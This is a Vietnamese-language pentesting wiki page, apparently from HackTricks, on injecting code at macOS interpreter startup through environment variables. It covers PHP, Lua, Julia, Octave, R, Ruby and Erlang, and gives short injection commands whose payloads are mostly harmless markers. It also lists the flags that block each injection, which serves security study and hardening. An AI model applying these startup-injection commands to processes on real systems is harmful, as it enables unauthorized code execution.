# Chèn mã khi khởi động trình thông dịch macOS qua biến môi trường

{{#include ../../../banners/hacktricks-training.md}}

Các kỹ thuật đặc thù theo runtime này sử dụng biến môi trường được kế thừa để chọn cấu hình khởi động, nạp trước mã hoặc cung cấp cờ VM trước khi chạy workload dự kiến. Một số biến thể dựa trên tệp; Lua và Erlang cũng hỗ trợ thực thi mã nội tuyến.

## Cấu hình khởi động PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` và `auto_prepend_file`

PHP CLI và CGI đọc cấu hình mỗi khi được gọi. `PHPRC` có thể chọn một tệp `php.ini` mà kẻ tấn công có quyền đọc, trong khi `PHP_INI_SCAN_DIR` có thể chuyển hướng thư mục được quét để tìm các tệp `.ini` bổ sung. Chỉ thị `auto_prepend_file` khiến PHP phân tích một tệp trước khi chạy script được yêu cầu, vì vậy sự kết hợp này cho phép thực thi mã khi khởi động.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Một lựa chọn khác là một thư mục chứa tệp `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Tùy chọn `-n` bỏ qua `php.ini`; đường dẫn `-c` đáng tin cậy được chỉ định rõ sẽ được ưu tiên hơn `PHPRC`. Lưu ý rằng SAPI của máy chủ chạy lâu dài thường đọc cấu hình khi máy chủ web khởi động, trong khi CLI và CGI đọc cấu hình mỗi lần được gọi.<sup>[[1]](#references)</sup>

## Mã khởi động Lua

### `LUA_INIT`

Trước khi xử lý các tùy chọn dòng lệnh hoặc script mục tiêu, trình thông dịch Lua độc lập thực thi `LUA_INIT_<major>_<minor>` hoặc `LUA_INIT` nếu biến có phiên bản không được thiết lập. Giá trị bắt đầu bằng `@` sẽ chỉ định một tệp; mọi giá trị khác được đánh giá trực tiếp dưới dạng mã Lua. Cách này cho phép thực thi khi khởi động cả từ tệp lẫn không cần tệp.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Tên có phiên bản chính xác thay đổi tùy theo interpreter, ví dụ `LUA_INIT_5_4`. `lua -E` bỏ qua tất cả biến môi trường, bao gồm mã khởi động và đường dẫn module Lua.

## Depot khởi động Julia

### `JULIA_DEPOT_PATH` và `startup.jl`

Julia thường thực thi `config/startup.jl` từ depot đầu tiên khi khởi động. `JULIA_DEPOT_PATH` kiểm soát danh sách depot, vì vậy trỏ biến này đến một cây thư mục mà attacker có thể đọc sẽ chuyển hướng tệp khởi động được tự động tải.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Dấu phân tách ở cuối hữu ích khi nạn nhân vẫn cần các package thông thường. `julia --startup-file=no` vô hiệu hóa startup file này. Xóa biến trước khi khởi chạy vì biến này cũng kiểm soát package registry, environment, cache và vị trí tải code.

## Các startup file của GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave thực thi một số file chứa các lệnh Octave hợp lệ trong quá trình khởi động. `OCTAVE_SITE_INITFILE` ghi đè startup file áp dụng trên toàn site, còn `OCTAVE_VERSION_INITFILE` ghi đè startup file dành riêng cho phiên bản, cho phép một trong hai biến chuyển hướng việc thực thi tự động đến một file mà attacker có thể đọc.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` chỉ bỏ qua các tệp của người dùng như `~/.octaverc`; nó **không** ngăn việc ghi đè tệp site ở trên. Dùng `--no-site-file` cho các tệp site hoặc `--norc` / `-f` để tắt tất cả tệp khởi động.<sup>[[7]](#references)</sup>

## Các profile khởi động và tải package của R

### `R_PROFILE_USER` / `R_PROFILE`

Khi khởi động, R nạp và thực thi các tệp profile site và người dùng chứa mã R. `R_PROFILE` chọn profile site còn `R_PROFILE_USER` chọn profile người dùng, cho phép môi trường được kế thừa chuyển hướng một trong hai lần tra cứu đến tệp mà kẻ tấn công có thể đọc.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` bỏ qua user profile, `--no-site-file` bỏ qua site profile, còn `--vanilla` áp dụng cả hai biện pháp bảo vệ. R xử lý trước các tệp môi trường được chọn bằng `R_ENVIRON` và `R_ENVIRON_USER`, nhưng các tệp đó chỉ thiết lập biến; các biến profile mới là primitive thực thi mã tùy ý trực tiếp.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` và đường dẫn thư viện

R gắn các package được phân tách bằng dấu phẩy trong `R_DEFAULT_PACKAGES` khi khởi động. `Rscript` ưu tiên `R_SCRIPT_DEFAULT_PACKAGES`. Kết hợp một trong hai biến này với `R_LIBS`, `R_LIBS_USER` hoặc `R_LIBS_SITE` có thể khiến R tìm và tải một package đã cài do kẻ tấn công kiểm soát; hook `.onLoad` hoặc `.onAttach` của package đó sẽ tự động chạy.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Điều này đòi hỏi một package R đã cài đặt có cấu trúc hợp lệ, không chỉ là một tệp `.R` rời. `--vanilla` không xóa các biến được kế thừa trực tiếp, vì vậy wrapper đáng tin cậy phải unset hoặc thay thế các biến package mặc định và đường dẫn library, đồng thời vô hiệu hóa các tệp profile.

## Tùy chọn loader của Ruby

### RUBYOPT

Ruby phân tích các tùy chọn dòng lệnh được hỗ trợ từ biến môi trường `RUBYOPT` trước khi chạy script. Ruby từ chối thực thi code thông qua `-e` trong `RUBYOPT`, nhưng `-I` có thể thêm một thư mục vào đầu đường dẫn tìm kiếm library và `-r` có thể require một library. Do đó, một process khởi chạy Ruby với các biến môi trường do attacker kiểm soát có thể bị khiến tải code Ruby do attacker kiểm soát.<sup>[[10]](#references)</sup>

Tạo `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Tạo một tập lệnh Ruby vô hại, chẳng hạn như `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Chạy nó với một giá trị `RUBYOPT` được kiểm soát:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Để tắt hành vi này, hãy truyền `--disable=rubyopt` (hoặc `--disable-rubyopt`) **trước** tên script:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Một tùy chọn được viết sau `hello.rb` sẽ được truyền cho script trong `ARGV`; nó không vô hiệu hóa việc Ruby xử lý `RUBYOPT` trước đó.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Thay vì thêm thư mục tải bằng `-I` bên trong `RUBYOPT`, biến môi trường riêng `RUBYLIB` thêm các thư mục vào `$LOAD_PATH` của Ruby. Khi kết hợp với `RUBYOPT=-r<module>`, cách này tải mã của kẻ tấn công mà không cần `-I` trong `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Các cờ VM của Erlang và Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` và `ERL_ZFLAGS`

Trình khởi chạy `erl` thêm `ERL_AFLAGS` vào đầu dòng lệnh, còn `ERL_FLAGS` / `ERL_ZFLAGS` vào cuối. Vì `-eval` đánh giá một biểu thức Erlang trong quá trình khởi tạo VM, các biến này có thể cho phép thực thi mã không cần tệp trước khi workload dự kiến chạy.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix và nhiều bản phát hành Elixir cuối cùng đều khởi chạy Erlang VM và có thể kế thừa các cờ này. Hãy xác nhận chính xác release wrapper: nó có thể dựng lại hoặc lọc các đối số VM, trong khi một số công cụ hỗ trợ rõ ràng `ERL_AFLAGS`, `ERL_ZFLAGS` hoặc `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Không giống hầu hết các kỹ thuật dựa trên tệp, payload `-eval` không cần tệp do attacker kiểm soát. Một wrapper đáng tin cậy nên xóa cả ba biến cờ Erlang (và `ELIXIR_ERL_OPTIONS` đối với Elixir) trước khi khởi chạy runtime; đừng cố tạo allowlist cho từng cờ VM trừ khi đã hiểu rõ parser và thứ tự xử lý.

## References

- [1] [Tệp cấu hình PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Trình thông dịch độc lập Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Giao diện dòng lệnh Julia: Tệp khởi động](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Biến môi trường Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Các tệp khởi động GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Tùy chọn dòng lệnh GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Khởi tạo khi bắt đầu một phiên R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Cài đặt và quản trị R: Các package bổ trợ](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Tài liệu Ruby - Tùy chọn dòng lệnh Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Lệnh `erl` và các biến môi trường](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Bản phát hành Elixir và tùy chọn môi trường VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
